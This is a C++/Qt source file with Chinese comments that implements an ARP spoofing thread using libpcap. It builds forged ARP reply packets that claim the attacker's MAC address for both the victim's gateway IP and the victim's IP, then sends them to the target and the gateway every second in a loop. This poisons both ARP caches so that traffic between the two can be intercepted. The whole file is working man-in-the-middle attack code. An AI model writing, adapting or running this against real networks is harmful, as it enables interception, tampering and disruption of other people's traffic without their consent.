#include "arpthread.h"
#include "QDebug"

arpthread::arpthread()
{
    stopped = false;
//    QTimer *timer = new QTimer(this);
//    connect(timer,SIGNAL(timeout()),this,SLOT(send()));
//    timer->start(1000);
}

arpthread::~arpthread()
{

}

void arpthread::run()
{
    fakeTargetArpPkt = BuildArpPacket(currentMac, gateIp,targetMac,targetIp);
    fakeGateArpPkt = BuildArpPacket(currentMac,targetIp,gateMac,gateIp);
    while(stopped!=true)
    {

        //arp包长度为60
        if(pcap_sendpacket(adhandle,fakeTargetArpPkt,60) == -1)
        {
           qDebug()<<"wrong";//报错
        }
        //构建欺骗网关的arp包

        if(pcap_sendpacket(adhandle,fakeGateArpPkt,60) == -1)
        {
            qDebug()<<"wrong";//报错
        }
        t.start();
        while(t.elapsed()<1000)
            QCoreApplication::processEvents();
    }

}

void arpthread::send()
{
//    fakeTargetArpPkt = BuildArpPacket(currentMac, gateIp,targetMac,targetIp);
//    //arp包长度为42
//    if(pcap_sendpacket(adhandle,fakeTargetArpPkt,42) == -1)
//    {
//       qDebug()<<"wrong";//报错
//    }
//    //构建欺骗网关的arp包
//    fakeGateArpPkt = BuildArpPacket(currentMac,targetIp,gateMac,gateIp);
//    if(pcap_sendpacket(adhandle,fakeGateArpPkt,42) == -1)
//    {
//        qDebug()<<"wrong";//报错
//    }
}

void arpthread::stop()
{
    stopped = true;
}

u_char * arpthread::BuildArpPacket(u_char *srcMac, u_long srcIP, u_char *destMac, u_long destIP)
{
    struct arp_packet packet;

//    //设置目的MAC地址
//    memcpy(packet.eth.dest_mac, destMac, 6);
//    //源MAC地址
//    memcpy(packet.eth.src_mac, srcMac, 6);
//    //上层协议为ARP协议
//    packet.eth.eh_type = htons(0x0806);

//    //硬件类型，Ethernet是0x0001
//    packet.arp.hardware_type = htons(0x0001);
//    //上层协议类型，IP为0x0800
//    packet.arp.protocol_type = htons(0x0800);
//    //硬件地址长度
//    packet.arp.add_len = 0x06;
//    //协议地址长度
//    packet.arp.pro_len = 0x04;
//    //操作，arp应答为2
//    packet.arp.option = htons(0x0002);
//    //源MAC地址
//    memcpy(packet.arp.sour_addr, srcMac, 6);
//    //源IP地址，即伪造的源IP地址
//    packet.arp.sour_ip = srcIP;
//    qDebug()<<srcIP;

//    //目的MAC地址
//    memcpy(packet.arp.dest_addr, destMac, 6);
//    //目的IP地址
//    packet.arp.dest_ip = destIP;

        //设置目的MAC地址
        memcpy(packet.dest_mac, destMac, 6);
        //源MAC地址
        memcpy(packet.src_mac, srcMac, 6);
        //上层协议为ARP协议
        packet.eh_type = htons(0x0806);

        //硬件类型，Ethernet是0x0001
        packet.hardware_type = htons(0x0001);
        //上层协议类型，IP为0x0800
        packet.protocol_type = htons(0x0800);
        //硬件地址长度
        packet.add_len = 0x06;
        //协议地址长度
        packet.pro_len = 0x04;
        //操作，arp应答为2
        packet.option = htons(0x0002);
        //源MAC地址
        memcpy(packet.sour_addr, srcMac, 6);
        //源IP地址，即伪造的源IP地址
        packet.sour_ip = srcIP;
        qDebug()<<srcIP;

        //目的MAC地址
        memcpy(packet.dest_addr, destMac, 6);
        //目的IP地址
        packet.dest_ip = destIP;
        //填充
        char *pad="000000000000000000";
        memcpy(packet.padding,pad,18);

    u_char * str = (u_char *)malloc(sizeof(arp_packet));
    memcpy(str,&packet,sizeof(arp_packet));
    for(int i=0;i<43;i++)
        qDebug("%x ",str[i]);
    return (u_char*)str;
}
void arpthread::getCheatInfo(pcap_t *adhandle, u_char *selfmac, u_long destip, u_char *destmac, u_long gateip, u_char *gatemac)
{
    this->adhandle = adhandle;
    currentMac = selfmac;
    targetIp = destip;
    targetMac = destmac;
    gateIp = gateip;
    gateMac = gatemac;
}
